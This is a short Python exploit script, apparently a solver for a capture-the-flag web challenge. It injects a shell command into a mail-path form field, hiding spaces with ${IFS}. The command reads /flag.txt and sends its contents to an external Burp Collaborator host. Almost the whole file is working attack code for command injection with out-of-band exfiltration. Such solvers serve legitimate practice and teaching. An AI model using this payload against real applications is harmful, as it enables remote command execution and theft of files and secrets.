import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python3 solver.py host:port\n\nExample: python3 solver.py python poc.py http://127.0.0.1/update")
    sys.exit(1)
hostURL = sys.argv[1]

def ssrf(webhook):
    data = (
        f"from=Ghostly+Support"
        f"&email=support%40void-whispers.htb"
        f"&sendMailPath=/usr/sbin/sendmail;curl${{IFS}}{webhook}?flag=$(cat${{IFS}}/flag.txt)"
        f"&mailProgram=sendmail"
    )
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive"
    }

    response = requests.post(hostURL, data=data, headers=headers, timeout=10)
    print(response.text)
    if response.status_code != 200:
        print(response.text)
        print(response.status_code)
        print("Something went wrong! Is the challenge host live?")
        sys.exit()

if __name__ == "__main__":
    webhook = "http://burpcollaborator.oastify.com" # 反弹地址burp
    ssrf(webhook)
